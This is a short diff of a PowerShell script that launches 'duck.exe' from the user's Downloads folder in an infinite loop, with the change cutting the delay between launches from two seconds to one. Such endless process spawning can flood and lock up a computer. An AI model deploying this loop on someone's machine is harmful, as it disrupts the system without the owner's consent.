@@ -5,5 +5,5 @@ $processName = "$env:USERPROFILE/Downloads/duck/duck/duck.exe"
 Start-Sleep -s 2
 while ($true) {
     Start-Process -FilePath $processName
-    Start-Sleep -Seconds 2  # Adjust the delay between each process start as needed
+    Start-Sleep -Seconds 1  # Adjust the delay between each process start as needed
 }
